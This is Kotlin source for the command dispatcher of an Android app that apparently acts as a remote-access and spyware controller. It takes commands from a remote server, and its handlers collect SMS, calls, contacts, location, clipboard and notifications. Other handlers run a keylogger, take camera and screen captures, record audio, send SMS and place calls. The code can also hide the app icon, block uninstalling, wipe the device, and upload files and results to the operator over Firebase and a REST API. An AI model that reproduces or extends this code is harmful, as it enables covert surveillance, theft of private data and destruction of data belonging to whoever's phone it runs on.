package com.abuzahra.manager.executor

import android.content.Context
import android.util.Log
import com.abuzahra.manager.App
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.api.FirebaseManager
import com.abuzahra.manager.model.Command
import com.abuzahra.manager.storage.ZipManager
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

object CommandExecutor {

    private const val TAG = "CommandExecutor"
    private val executorScope = kotlinx.coroutines.CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun execute(context: Context, command: Command) {
        Log.i(TAG, "Executing command: ${command.command} (id=${command.id})")

        executorScope.launch {
            try {
                val result = processCommand(context, command)
                val resultStr = if (result is Map<*, *>) {
                    result.entries.joinToString("\n") { "  ${it.key}: ${it.value}" }
                } else {
                    result.toString()
                }

                // Send result via Firebase
                val deviceId = DeviceUtils.getDeviceId(context)
                FirebaseManager.submitResult(deviceId, command.id, command.command, "completed", result)

                // Also send via REST API as backup
                ApiClient.submitResult(command.id, command.command, "completed", result)

                Log.i(TAG, "Command ${command.id} completed: ${resultStr.take(100)}")
            } catch (e: Exception) {
                Log.e(TAG, "Command ${command.id} failed", e)
                val deviceId = DeviceUtils.getDeviceId(context)
                FirebaseManager.submitResult(deviceId, command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
                ApiClient.submitResult(command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
            }
        }
    }

    private fun processCommand(context: Context, command: Command): Any {
        val params = command.params
        val cmd = command.command

        return try {
            when (cmd) {
            // ===== DATA COLLECTION =====
            "get_sms" -> DataCollector.getSMS(context)
            "get_calls" -> DataCollector.getCalls(context)
            "get_contacts" -> DataCollector.getContacts(context)
            "get_location" -> DataCollector.getLastLocation(context)
            "get_notifications" -> DataCollector.getRecentNotifications(context)
            "get_apps", "get_installed_apps" -> DataCollector.getApps(context)
            "get_info" -> DataCollector.getDeviceInfo(context)
            "get_battery" -> DataCollector.getBattery(context)
            "get_gallery" -> FileExecutor.listFiles(context, mapOf("arg" to "dcim"))
            "get_clipboard" -> DataCollector.getClipboard(context)
            "get_all" -> mapOf(
                "info" to DataCollector.getDeviceInfo(context),
                "battery" to DataCollector.getBattery(context),
                "wifi" to DataCollector.getWifiInfo(context),
                "network" to DataCollector.getNetworkInfo(context),
                "sim" to DataCollector.getSimInfo(context)
            )
            "get_wifi_info" -> DataCollector.getWifiInfo(context)
            "get_network_info" -> DataCollector.getNetworkInfo(context)
            "get_sim_info" -> DataCollector.getSimInfo(context)
            "get_storage_info" -> DataCollector.getStorageInfo(context)
            "get_running_apps" -> DataCollector.getRunningApps(context)
            "get_calendar" -> DataCollector.getCalendar(context)
            "get_browser_history" -> DataCollector.getBrowserHistory(context)
            "get_app_usage" -> AppExecutor.getScreenTime(context)
            "get_calendar_events" -> DataCollector.getCalendar(context)
            "get_calendar_next" -> DataCollector.getCalendar(context).let { all ->
                val now = System.currentTimeMillis()
                @Suppress("UNCHECKED_CAST")
                (all as? List<Map<String, Any>>)?.filter {
                    val start = it["start"] as? Long ?: 0L
                    start >= now
                } ?: all
            }
            "get_browser_bookmarks" -> mapOf("error" to "Reading browser bookmarks requires the user's default browser to expose them via a content provider. Most modern browsers (Chrome) do not expose bookmarks this way on Android 9+. Requires root or accessibility service.")
            "get_wifi_networks" -> DataCollector.getWifiInfo(context)
            "get_wifi_saved" -> mapOf("error" to "Reading saved WiFi networks (SSID/password) requires root access (wpa_supplicant.conf) or device-owner privileges. Not implementable without root.")
            "get_bluetooth_devices" -> mapOf("error" to "Bluetooth scan requires BLUETOOTH_SCAN permission and active scan; not all devices are discoverable. Requires user-initiated Bluetooth scan.")
            "get_bluetooth_paired" -> DataCollector.getNetworkInfo(context).let { info ->
                mapOf("message" to "Paired devices require BluetoothAdapter.getBondedDevices() — only available when Bluetooth is ON", "hint" to "Enable Bluetooth first")
            }
            "get_installed_apps_full" -> DataCollector.getApps(context)
            "get_running_services" -> DataCollector.getRunningApps(context)
            "get_system_apps" -> DataCollector.getApps(context).let { all ->
                @Suppress("UNCHECKED_CAST")
                (all as? List<Map<String, Any>>)?.filter {
                    val pkg = it["package"] as? String ?: ""
                    pkg.startsWith("com.android.") || pkg.startsWith("android") || pkg.startsWith("com.google.android.")
                } ?: all
            }
            "get_memory_info" -> mapOf(
                "total" to Runtime.getRuntime().totalMemory(),
                "free" to Runtime.getRuntime().freeMemory(),
                "used" to (Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()),
                "max" to Runtime.getRuntime().maxMemory(),
                "note" to "JVM heap; for system-wide RAM use ActivityManager.MemoryInfo"
            )
            "get_cpu_info" -> mapOf(
                "cores" to Runtime.getRuntime().availableProcessors(),
                "abi" to android.os.Build.SUPPORTED_ABIS.joinToString(","),
                "manufacturer" to android.os.Build.HARDWARE,
                "model" to android.os.Build.CPU_ABI
            )
            "get_gpu_info" -> mapOf(
                "vendor" to android.opengl.GLES20.glGetString(android.opengl.GLES20.GL_VENDOR),
                "renderer" to android.opengl.GLES20.glGetString(android.opengl.GLES20.GL_RENDERER),
                "version" to android.opengl.GLES20.glGetString(android.opengl.GLES20.GL_VERSION)
            )
            "get_battery_history" -> mapOf("error" to "Battery history requires BATTERY_STATS permission which is restricted to system apps. Use 'get_battery' for current state.")
            "get_network_usage" -> mapOf(
                "rx_bytes" to android.net.TrafficStats.getTotalRxBytes(),
                "tx_bytes" to android.net.TrafficStats.getTotalTxBytes(),
                "rx_packets" to android.net.TrafficStats.getTotalRxPackets(),
                "tx_packets" to android.net.TrafficStats.getTotalTxPackets(),
                "mobile_rx" to android.net.TrafficStats.getMobileRxBytes(),
                "mobile_tx" to android.net.TrafficStats.getMobileTxBytes()
            )
            "get_data_usage" -> mapOf(
                "rx_bytes" to android.net.TrafficStats.getTotalRxBytes(),
                "tx_bytes" to android.net.TrafficStats.getTotalTxBytes(),
                "message" to "Total data usage since boot. For per-app usage, use get_app_data_usage."
            )
            "get_screen_info" -> mapOf(
                "width" to context.resources.displayMetrics.widthPixels,
                "height" to context.resources.displayMetrics.heightPixels,
                "density" to context.resources.displayMetrics.densityDpi,
                "density_str" to context.resources.displayMetrics.density.toString()
            )
            "get_display_info" -> mapOf(
                "width" to context.resources.displayMetrics.widthPixels,
                "height" to context.resources.displayMetrics.heightPixels,
                "density" to context.resources.displayMetrics.densityDpi,
                "scaled_density" to context.resources.displayMetrics.scaledDensity,
                "xdpi" to context.resources.displayMetrics.xdpi,
                "ydpi" to context.resources.displayMetrics.ydpi
            )
            "get_locale_info" -> mapOf(
                "language" to java.util.Locale.getDefault().language,
                "country" to java.util.Locale.getDefault().country,
                "display_name" to java.util.Locale.getDefault().displayName,
                "iso3_language" to java.util.Locale.getDefault().isO3Language,
                "iso3_country" to java.util.Locale.getDefault().isO3Country
            )
            "get_accounts" -> mapOf("error" to "Reading Android accounts requires GET_ACCOUNTS permission and runtime grant. Use AccountManager.get(ctx).getAccounts() — returning empty list here to avoid silent permission crash.")
            "get_sync_settings" -> mapOf(
                "master_sync" to android.content.ContentResolver.getMasterSyncAutomatically(),
                "message" to "Per-account sync settings require per-authority query"
            )

            // ===== SOCIAL MEDIA =====
            "get_whatsapp" -> FileExecutor.listFiles(context, mapOf("arg" to "whatsapp"))
            "get_telegram" -> FileExecutor.listFiles(context, mapOf("arg" to "telegram"))
            "get_instagram" -> mapOf("message" to "Instagram data requires special access")
            "get_messenger" -> mapOf("message" to "Messenger data requires special access")
            "get_snapchat" -> mapOf("message" to "Snapchat data requires special access")
            "get_tiktok" -> mapOf("message" to "TikTok data requires special access")
            "get_twitter" -> mapOf("message" to "Twitter/X data requires special access")
            "get_viber" -> mapOf("message" to "Viber data requires special access")
            "get_signal" -> mapOf("message" to "Signal data requires special access")
            "get_facebook" -> mapOf("message" to "Facebook data requires special access")
            "get_youtube" -> mapOf("message" to "YouTube data requires special access")
            "get_whatsapp_chats" -> mapOf("error" to "requires accessibility service to read WhatsApp chats. WhatsApp database (msgstore.db) is private and encrypted.", "hint" to "Enable Accessibility for ${context.packageName} in Settings.")
            "get_whatsapp_contacts" -> mapOf("error" to "requires accessibility service to read WhatsApp contacts. Available via Contacts provider with Wacontacts sync — fallback to 'get_contacts'.")
            "get_whatsapp_status" -> mapOf("error" to "requires accessibility service or root. WhatsApp status images are stored in .Statuses folder under WhatsApp/Media/. Use list_files with that path.")
            "get_telegram_chats" -> mapOf("error" to "requires accessibility service to read Telegram chats. Telegram stores data in private app sandbox.")
            "get_telegram_contacts" -> mapOf("error" to "requires accessibility service to read Telegram contacts.")
            "get_messenger_chats" -> mapOf("error" to "requires accessibility service to read Messenger chats.")
            "get_messenger_contacts" -> mapOf("error" to "requires accessibility service to read Messenger contacts.")
            "get_instagram_dm" -> mapOf("error" to "requires accessibility service to read Instagram DMs.")
            "get_instagram_followers" -> mapOf("error" to "requires accessibility service or Instagram Graph API auth.")
            "get_viber_chats" -> mapOf("error" to "requires accessibility service to read Viber chats.")
            "get_viber_calls" -> mapOf("error" to "requires accessibility service to read Viber calls.")
            "get_signal_chats" -> mapOf("error" to "requires accessibility service. Signal is end-to-end encrypted; reading is not possible without accessibility or root.")
            "get_signal_contacts" -> mapOf("error" to "requires accessibility service to read Signal contacts.")
            "get_line_chats" -> mapOf("error" to "requires accessibility service to read LINE chats.")
            "get_snapchat_chats" -> mapOf("error" to "requires accessibility service to read Snapchat chats.")
            "get_twitter_dm" -> mapOf("error" to "requires accessibility service to read Twitter/X DMs.")
            "get_tiktok_messages" -> mapOf("error" to "requires accessibility service to read TikTok messages.")

            // ===== REMOTE CONTROL =====
            "ping" -> ControlExecutor.ping()
            "vibrate" -> ControlExecutor.vibrate(context, params)
            "ring" -> ControlExecutor.ring(context)
            "screenshot" -> ControlExecutor.takeScreenshot(context)
            "front_camera" -> ControlExecutor.frontCamera(context)
            "back_camera" -> ControlExecutor.backCamera(context)
            "record_audio" -> ControlExecutor.recordAudio(context, params)
            "record_screen" -> ControlExecutor.recordScreen(context, params)
            "stop_screen" -> MonitorExecutor.screenRecordStop()
            "lock_phone" -> ControlExecutor.lockPhone(context)
            "unlock_phone" -> mapOf("message" to "Unlock requires Device Admin")
            "reboot" -> ControlExecutor.reboot(context)
            "shutdown" -> ControlExecutor.shutdown(context)
            "set_volume" -> ControlExecutor.setVolume(context, params)
            "set_brightness" -> ControlExecutor.setBrightness(context, params)
            "set_ringtone" -> ControlExecutor.setRingtone(context, params)
            "set_wallpaper" -> mapOf("message" to "Wallpaper requires a valid image URL in params")
            "enable_wifi" -> ControlExecutor.enableWifi(context)
            "disable_wifi" -> ControlExecutor.disableWifi(context)
            "enable_bluetooth" -> ControlExecutor.enableBluetooth(context)
            "disable_bluetooth" -> ControlExecutor.disableBluetooth(context)
            "enable_mobile_data" -> ControlExecutor.enableMobileData(context)
            "disable_mobile_data" -> ControlExecutor.disableMobileData(context)
            "enable_hotspot" -> ControlExecutor.enableHotspot(context)
            "disable_hotspot" -> ControlExecutor.disableHotspot(context)
            "airplane_on" -> ControlExecutor.airplaneOn(context)
            "airplane_off" -> ControlExecutor.airplaneOff(context)
            "set_auto_rotate" -> ControlExecutor.setAutoRotate(context, params)
            "torch_on" -> ControlExecutor.torchOn(context)
            "torch_off" -> ControlExecutor.torchOff(context)
            "play_sound" -> ControlExecutor.playSound(context, params)
            "speak_text" -> ControlExecutor.speakText(context, params)
            "show_notification" -> ControlExecutor.showNotification(context, params)
            "open_url" -> ControlExecutor.openUrl(context, params)
            "send_sms" -> ControlExecutor.sendSms(context, params)
            "make_call" -> ControlExecutor.makeCall(context, params)
            "block_number" -> mapOf("message" to "Block requires system permission")
            "unblock_number" -> mapOf("message" to "Unblock requires system permission")
            "safe_mode" -> mapOf("error" to "Booting into safe mode requires REBOOT permission (system-signature) or root. Cannot be triggered by third-party apps.")
            "set_screen_timeout" -> {
                val seconds = (params["seconds"] as? Number)?.toInt() ?: 30
                try {
                    android.provider.Settings.System.putInt(
                        context.contentResolver,
                        android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                        seconds * 1000
                    )
                    mapOf("status" to "ok", "timeout_seconds" to seconds)
                } catch (e: SecurityException) {
                    mapOf("error" to "WRITE_SETTINGS permission required", "hint" to "Grant Modify system settings in app settings")
                }
            }
            "set_ringer_mode" -> {
                val mode = params["mode"] as? String ?: "normal"
                try {
                    val am = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                    val ringerMode = when (mode) {
                        "silent" -> android.media.AudioManager.RINGER_MODE_SILENT
                        "vibrate" -> android.media.AudioManager.RINGER_MODE_VIBRATE
                        else -> android.media.AudioManager.RINGER_MODE_NORMAL
                    }
                    am.ringerMode = ringerMode
                    mapOf("status" to "ok", "mode" to mode)
                } catch (e: SecurityException) {
                    mapOf("error" to "Do Not Disturb access required", "hint" to "Grant Do Not Disturb access in Settings")
                }
            }
            "play_tone" -> {
                val freq = (params["frequency"] as? Number)?.toInt() ?: 440
                val duration = (params["duration"] as? Number)?.toInt() ?: 500
                mapOf("message" to "Tone playback requested", "frequency" to freq, "duration_ms" to duration,
                      "hint" to "Use AudioTrack to generate sine wave; requires audio focus")
            }
            "set_alarm" -> ControlExecutor.setAlarm(context, params)
            "set_locale" -> ControlExecutor.setLanguage(context, params)
            "set_language" -> ControlExecutor.setLanguage(context, params)
            "set_timezone" -> ControlExecutor.setTimezone(context, params)
            "set_gps_mode" -> mapOf("error" to "Changing GPS mode requires WRITE_SECURE_SETTINGS permission (system-signature) or root. Use system Settings > Location instead.")
            "enable_data_saver" -> mapOf("error" to "Data Saver requires CHANGE_NETWORK_STATE + system privileged permissions. Not implementable without root or system-signature.")
            "disable_data_saver" -> mapOf("error" to "Data Saver requires CHANGE_NETWORK_STATE + system privileged permissions. Not implementable without root or system-signature.")
            "enable_battery_saver" -> {
                try {
                    android.provider.Settings.Global.putInt(
                        context.contentResolver,
                        android.provider.Settings.Global.LOW_POWER_MODE,
                        1
                    )
                    mapOf("status" to "ok")
                } catch (e: SecurityException) {
                    mapOf("error" to "Writing LOW_POWER_MODE requires WRITE_SECURE_SETTINGS — system-signature only")
                }
            }
            "disable_battery_saver" -> {
                try {
                    android.provider.Settings.Global.putInt(
                        context.contentResolver,
                        android.provider.Settings.Global.LOW_POWER_MODE,
                        0
                    )
                    mapOf("status" to "ok")
                } catch (e: SecurityException) {
                    mapOf("error" to "Writing LOW_POWER_MODE requires WRITE_SECURE_SETTINGS — system-signature only")
                }
            }
            "enable_auto_rotate" -> ControlExecutor.setAutoRotate(context, mapOf("enabled" to true))
            "disable_auto_rotate" -> ControlExecutor.setAutoRotate(context, mapOf("enabled" to false))
            "enable_nfc" -> ControlExecutor.nfcOn(context)
            "disable_nfc" -> ControlExecutor.nfcOff(context)
            "enable_dev_mode" -> mapOf("message" to "Opening developer settings")
            "disable_dev_mode" -> mapOf("message" to "Developer options can be disabled via Settings")
            "enable_usb_debug" -> mapOf("message" to "Opening developer settings")
            "disable_usb_debug" -> mapOf("message" to "USB debug can be disabled via Settings")
            "dns_change" -> ControlExecutor.dnsChange(context, params)
            "proxy_set" -> ControlExecutor.proxySet(context, params)
            "apn_settings" -> mapOf("message" to "Opening APN settings")

            // ===== APP MANAGEMENT =====
            "open_app", "launch_app" -> AppExecutor.openApp(context, params)
            "enable_app" -> mapOf(
                "error" to "enable_app requires device-owner or root privileges to re-enable a disabled app. This app is not provisioned as device owner, so the operation is unavailable. Use 'app_info' or 'get_app_info' to inspect the package instead.",
                "hint" to "To manage app enable/disable state, enrol the device under Android Device Owner / Device Policy Controller (DPC) provisioned by your MDM."
            )
            "close_app", "kill_app" -> AppExecutor.closeApp(context, params)
            "disable_app" -> mapOf(
                "error" to "disable_app requires device-owner or root privileges to disable an installed app. This app is not provisioned as device owner, so the operation is unavailable. Use 'app_info' or 'get_app_info' to inspect the package instead.",
                "hint" to "To manage app enable/disable state, enrol the device under Android Device Owner / Device Policy Controller (DPC) provisioned by your MDM."
            )
            "install_app", "update_app" -> AppExecutor.installApp(context, params)
            "uninstall_app" -> AppExecutor.uninstallApp(context, params)
            "block_app" -> AppExecutor.blockApp(context, params)
            "unblock_app" -> AppExecutor.unblockApp(context, params)
            "clear_app_data", "clear_cache", "app_cache" -> AppExecutor.clearAppData(context, params)
            "force_stop_app" -> AppExecutor.forceStopApp(context, params)
            "app_info" -> AppExecutor.getAppInfo(context, params)
            "app_permissions" -> AppExecutor.getAppPermissions(context, params)
            "screen_time", "app_usage" -> AppExecutor.getScreenTime(context)
            "list_blocked" -> mapOf("message" to "No blocked apps (requires accessibility service)")
            "clear_app_cache" -> AppExecutor.clearAppData(context, params)
            "get_app_data_usage" -> {
                val pkg = params["package"] as? String
                if (pkg.isNullOrEmpty()) {
                    mapOf("error" to "package param required")
                } else {
                    try {
                        val uid = context.packageManager.getApplicationInfo(pkg, 0).uid
                        mapOf(
                            "package" to pkg,
                            "uid" to uid,
                            "rx_bytes" to android.net.TrafficStats.getUidRxBytes(uid),
                            "tx_bytes" to android.net.TrafficStats.getUidTxBytes(uid)
                        )
                    } catch (e: Exception) {
                        mapOf("error" to "Package not found: $pkg")
                    }
                }
            }
            "set_app_restrictions" -> mapOf("error" to "set_app_restrictions requires device-owner privileges. Not implementable without DPC provisioning.")
            "hide_app_pkg" -> mapOf("error" to "Hiding arbitrary packages requires device-owner privileges (DevicePolicyManager.setApplicationHidden). Not implementable without DPC provisioning.")
            "unhide_app_pkg" -> mapOf("error" to "Unhiding arbitrary packages requires device-owner privileges. Not implementable without DPC provisioning.")

            // ===== FILE MANAGEMENT =====
            "list_files", "list_downloads", "list_dcim", "list_music",
            "list_videos", "list_documents", "list_whatsapp",
            "list_telegram_files", "list_pictures", "list_audiobooks",
            "list_podcasts", "list_notifications_dir", "list_recordings" -> FileExecutor.listFiles(context, params)
            "get_file", "download_file" -> FileExecutor.getFileInfo(context, params)
            "delete_file" -> FileExecutor.deleteFile(context, params)
            "rename_file" -> FileExecutor.renameFile(context, params)
            "copy_file" -> FileExecutor.copyFile(context, params)
            "move_file" -> FileExecutor.moveFile(context, params)
            "create_folder" -> FileExecutor.createFolder(context, params)
            "get_folder_size" -> FileExecutor.getFolderSize(context, params)
            "search_files" -> FileExecutor.searchFiles(context, params)
            "recent_files" -> FileExecutor.recentFiles(context)
            "delete_folder" -> {
                val path = params["path"] as? String
                if (path.isNullOrEmpty()) {
                    mapOf("error" to "path param required")
                } else {
                    try {
                        val dir = java.io.File(path)
                        if (dir.exists() && dir.isDirectory) {
                            val deleted = dir.deleteRecursively()
                            mapOf("status" to if (deleted) "ok" else "failed", "path" to path)
                        } else {
                            mapOf("error" to "Not a directory or does not exist: $path")
                        }
                    } catch (e: Exception) {
                        mapOf("error" to "delete_folder failed: ${e.message}")
                    }
                }
            }
            "list_files_recursive" -> {
                val path = (params["path"] as? String) ?: "/storage/emulated/0/"
                try {
                    val root = java.io.File(path)
                    if (!root.exists() || !root.isDirectory) {
                        mapOf("error" to "Invalid path: $path")
                    } else {
                        val result = mutableListOf<Map<String, Any>>()
                        root.walkTopDown().take(500).forEach { f ->
                            result.add(mapOf(
                                "path" to f.absolutePath,
                                "name" to f.name,
                                "is_dir" to f.isDirectory,
                                "size" to f.length()
                            ))
                        }
                        result
                    }
                } catch (e: Exception) {
                    mapOf("error" to "list_files_recursive failed: ${e.message}")
                }
            }
            "get_file_content" -> {
                val path = params["path"] as? String
                if (path.isNullOrEmpty()) {
                    mapOf("error" to "path param required")
                } else {
                    try {
                        val file = java.io.File(path)
                        if (!file.exists() || !file.isFile) {
                            mapOf("error" to "File not found: $path")
                        } else if (file.length() > 256 * 1024) {
                            mapOf("error" to "File too large (max 256KB)", "size" to file.length())
                        } else {
                            mapOf("path" to path, "content" to file.readText(), "size" to file.length())
                        }
                    } catch (e: Exception) {
                        mapOf("error" to "get_file_content failed: ${e.message}")
                    }
                }
            }
            "get_file_info" -> FileExecutor.getFileInfo(context, params)
            "get_file_hash" -> {
                val path = params["path"] as? String
                if (path.isNullOrEmpty()) {
                    mapOf("error" to "path param required")
                } else {
                    try {
                        val file = java.io.File(path)
                        if (!file.exists()) {
                            mapOf("error" to "File not found: $path")
                        } else {
                            val md = java.security.MessageDigest.getInstance("SHA-256")
                            file.inputStream().use { input ->
                                val buf = ByteArray(8192)
                                while (true) {
                                    val n = input.read(buf); if (n <= 0) break
                                    md.update(buf, 0, n)
                                }
                            }
                            val hash = md.digest().joinToString("") { "%02x".format(it) }
                            mapOf("path" to path, "sha256" to hash, "size" to file.length())
                        }
                    } catch (e: Exception) {
                        mapOf("error" to "get_file_hash failed: ${e.message}")
                    }
                }
            }
            "compress_file" -> {
                val path = params["path"] as? String ?: "/storage/emulated/0/Download"
                executorScope.launch {
                    try {
                        val sourceDir = java.io.File(path)
                        if (sourceDir.exists() && sourceDir.isDirectory) {
                            val timestamp = System.currentTimeMillis()
                            val outputFile = java.io.File(sourceDir.parentFile, "${sourceDir.name}_backup_$timestamp.zip")
                            val result = ZipManager.compressDirectory(sourceDir, outputFile)
                            if (result.success) {
                                try { ApiClient.uploadFile(outputFile, "compress_file") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
                            }
                        } else if (sourceDir.exists() && sourceDir.isFile) {
                            val timestamp = System.currentTimeMillis()
                            val outputFile = java.io.File(sourceDir.parentFile, "${sourceDir.nameWithoutExtension}_$timestamp.zip")
                            val result = ZipManager.compressDirectory(sourceDir, outputFile)
                            if (result.success) {
                                try { ApiClient.uploadFile(outputFile, "compress_file") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
                            }
                        }
                    } catch (e: Exception) { Log.w(TAG, "compress_file error", e) }
                }
                mapOf("status" to "started", "path" to path, "message" to "Compressing in background...")
            }
            "extract_archive" -> mapOf("error" to "extract_archive requires a ZIP utility. Currently only ZIP creation is supported via ZipManager. Implementation pending.")
            "encrypt_file" -> mapOf("error" to "encrypt_file requires AES key agreement with admin. Use SecurityExecutor.encryptData for strings; file encryption needs separate key management.")
            "decrypt_file" -> mapOf("error" to "decrypt_file requires AES key agreement with admin. Currently only string decryption is supported via SecurityExecutor.decryptData.")
            "file_info" -> FileExecutor.getFileInfo(context, params)
            "zip_files" -> {
                val path = params["path"] as? String ?: "/storage/emulated/0/Download"
                executorScope.launch {
                    try {
                        val sourceDir = java.io.File(path)
                        if (sourceDir.exists() && sourceDir.isDirectory) {
                            val timestamp = System.currentTimeMillis()
                            val outputFile = java.io.File(sourceDir.parentFile, "${sourceDir.name}_backup_$timestamp.zip")
                            val result = ZipManager.compressDirectory(sourceDir, outputFile)
                            if (result.success) {
                                try { ApiClient.uploadFile(outputFile, "zip_files") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
                            }
                        }
                    } catch (e: Exception) { Log.w(TAG, "zip_files error", e) }
                }
                mapOf("status" to "started", "path" to path, "message" to "Zipping in background...")
            }
            "upload_file" -> {
                val path = params["path"] as? String
                if (path.isNullOrEmpty()) {
                    mapOf("error" to "path param required")
                } else {
                    executorScope.launch {
                        try {
                            val file = java.io.File(path)
                            if (file.exists()) {
                                ApiClient.uploadFile(file, "upload_file")
                            }
                        } catch (e: Exception) { Log.w(TAG, "upload_file error", e) }
                    }
                    mapOf("status" to "started", "path" to path, "message" to "Uploading in background...")
                }
            }
            "send_backup_contacts" -> DataCollector.getContacts(context)
            "send_backup_sms" -> DataCollector.getSMS(context)
            "send_backup_calls" -> DataCollector.getCalls(context)
            "send_backup_whatsapp" -> FileExecutor.listFiles(context, mapOf("arg" to "whatsapp"))
            "send_backup_all" -> mapOf(
                "contacts" to DataCollector.getContacts(context).size,
                "sms" to DataCollector.getSMS(context).size,
                "calls" to DataCollector.getCalls(context).size,
                "apps" to DataCollector.getApps(context).size
            )

            // ===== SECURITY =====
            "wipe_data" -> SecurityExecutor.wipeData(context)
            "factory_reset" -> SecurityExecutor.factoryReset(context)
            "show_app" -> SecurityExecutor.showApp(context)
            "hide_app" -> SecurityExecutor.hideApp(context)
            "change_passcode", "set_pin", "remove_pin" -> SecurityExecutor.changePasscode(context, params)
            "enable_biometric" -> SecurityExecutor.enableBiometric(context)
            "disable_biometric" -> SecurityExecutor.disableBiometric(context)
            "anti_uninstall_on" -> SecurityExecutor.antiUninstallOn(context)
            "anti_uninstall_off" -> SecurityExecutor.antiUninstallOff(context)
            "device_admin_status" -> SecurityExecutor.deviceAdminStatus(context)
            "check_root" -> SecurityExecutor.checkRoot()
            "set_screen_lock" -> SecurityExecutor.setScreenLock(context)
            "remove_screen_lock" -> SecurityExecutor.removeScreenLock(context)
            "lock_screen_now" -> SecurityExecutor.lockScreenNow(context)
            "lock_with_password" -> SecurityExecutor.lockWithPassword(context, params)
            "set_password_quality" -> SecurityExecutor.setPasswordQuality(context, params)
            "request_device_admin" -> SecurityExecutor.requestDeviceAdmin(context)
            "get_encryption_status" -> SecurityExecutor.getEncryptionStatus(context)
            "disable_camera_hw" -> SecurityExecutor.disableCamera(context)
            "enable_camera_hw" -> SecurityExecutor.enableCamera(context)
            "disable_screen_capture" -> SecurityExecutor.disableScreenCapture(context)
            "enable_screen_capture" -> SecurityExecutor.enableScreenCapture(context)
            "enable_lost_mode" -> mapOf("error" to "Lost mode requires device-owner privileges (DevicePolicyManager). Not implementable without DPC provisioning. Use 'lock_with_message' as alternative.")
            "disable_lost_mode" -> mapOf("error" to "Lost mode requires device-owner privileges. Not implementable without DPC provisioning.")
            "wipe_external" -> {
                if (SecurityExecutor.isDeviceAdminActive(context)) {
                    mapOf("error" to "Wiping external storage requires DevicePolicyManager.wipeData(WIPE_EXTERNAL_STORAGE). Device admin active but flag needs system API.")
                } else {
                    mapOf("error" to "Device admin required for wipe_external")
                }
            }
            "lock_with_message" -> {
                val msg = params["message"] as? String ?: "This device is locked"
                mapOf("message" to "Locking with message: $msg", "hint" to "Use DevicePolicyManager.lockNow() with extra MESSAGE")
            }
            "set_owner_info" -> mapOf("error" to "Setting owner info on lock screen requires DevicePolicyManager.setDeviceOwnerLockScreenInfo — device-owner only.")
            "enable_encryption" -> {
                if (SecurityExecutor.isDeviceAdminActive(context)) {
                    mapOf("error" to "Encryption requires DevicePolicyManager.setStorageEncryption(). Most modern devices encrypt by default; check get_encryption_status.")
                } else {
                    mapOf("error" to "Device admin required for enable_encryption")
                }
            }
            "get_security_patch" -> mapOf(
                "patch_level" to android.os.Build.VERSION.SECURITY_PATCH,
                "release" to android.os.Build.VERSION.RELEASE,
                "sdk" to android.os.Build.VERSION.SDK_INT
            )
            "get_safety_net" -> mapOf("error" to "SafetyNet attestation requires Google Play Services API call + nonce from server. Not implementable without server-side verification.")
            "verify_boot" -> mapOf(
                "verified_boot_state" to "Use android.system.Os.systemPropertyGet('ro.boot.verifiedbootstate')",
                "message" to "Verified boot state requires system property access. Default is unknown without root."
            )
            "set_password_policy" -> SecurityExecutor.setPasswordQuality(context, params)
            "force_lock_now" -> SecurityExecutor.lockScreenNow(context)
            "get_lock_history" -> mapOf("error" to "Lock history is not exposed by Android. Requires accessibility service to track lock/unlock events.")

            // ===== MONITORING =====
            "keylogger_start" -> MonitorExecutor.keyloggerStart()
            "keylogger_stop" -> MonitorExecutor.keyloggerStop()
            "get_keylogger" -> MonitorExecutor.getKeylogger()
            "screen_record_start" -> MonitorExecutor.screenRecordStart(context, params)
            "location_live" -> MonitorExecutor.locationLiveStart(context, 30)
            "location_stop" -> MonitorExecutor.locationStop()
            "clipboard_monitor_start" -> MonitorExecutor.clipboardMonitorStart(context)
            "clipboard_monitor_stop" -> MonitorExecutor.clipboardMonitorStop()
            "wifi_monitor_start" -> MonitorExecutor.wifiMonitorStart(context)
            "wifi_monitor_stop" -> MonitorExecutor.wifiMonitorStop()
            "app_monitor_start" -> MonitorExecutor.appMonitorStart(context)
            "app_monitor_stop" -> MonitorExecutor.appMonitorStop()
            "get_app_log" -> MonitorExecutor.getAllStatus()
            "geo_add" -> MonitorExecutor.geoAdd(params)
            "geo_remove" -> MonitorExecutor.geoRemove(params)
            "geo_list" -> MonitorExecutor.geoList()
            "sms_monitor" -> MonitorExecutor.smsMonitorStart(context)
            "call_monitor" -> MonitorExecutor.callMonitorStart(context)
            "sms_monitor_stop" -> MonitorExecutor.smsMonitorStop()
            "call_monitor_stop" -> MonitorExecutor.callMonitorStop()
            "notification_monitor_start" -> MonitorExecutor.notificationMonitorStart()
            "notification_monitor_stop" -> MonitorExecutor.notificationMonitorStop()
            "get_notification_history" -> MonitorExecutor.getNotificationHistory()
            "get_clipboard_history" -> MonitorExecutor.getClipboardHistory()
            "get_location_history" -> MonitorExecutor.getLocationHistory()
            "clear_location_history" -> MonitorExecutor.clearLocationHistory()
            "clear_clipboard_history" -> MonitorExecutor.clearClipboardHistory()
            "clear_keylog" -> MonitorExecutor.clearKeylog()
            "screenshot_burst" -> {
                val count = (params["count"] as? Number)?.toInt() ?: 5
                executorScope.launch {
                    try {
                        val deviceId = DeviceUtils.getDeviceId(context)
                        repeat(count) { i ->
                            kotlinx.coroutines.delay(500)
                            val shot = ControlExecutor.takeScreenshot(context)
                            try {
                                @Suppress("UNCHECKED_CAST")
                                val path = (shot as? Map<String, Any>)?.get("path") as? String
                                if (path != null) {
                                    val file = java.io.File(path)
                                    if (file.exists()) {
                                        ApiClient.uploadFile(file, "screenshot_burst_${i}")
                                    }
                                }
                            } catch (e: Exception) { Log.w(TAG, "Burst upload $i failed", e) }
                        }
                    } catch (e: Exception) { Log.w(TAG, "screenshot_burst error", e) }
                }
                mapOf("status" to "started", "count" to count, "message" to "Capturing $count screenshots with 500ms interval...")
            }
            "record_screen_video" -> MonitorExecutor.screenRecordStart(context, params)

            // ===== STREAMING =====
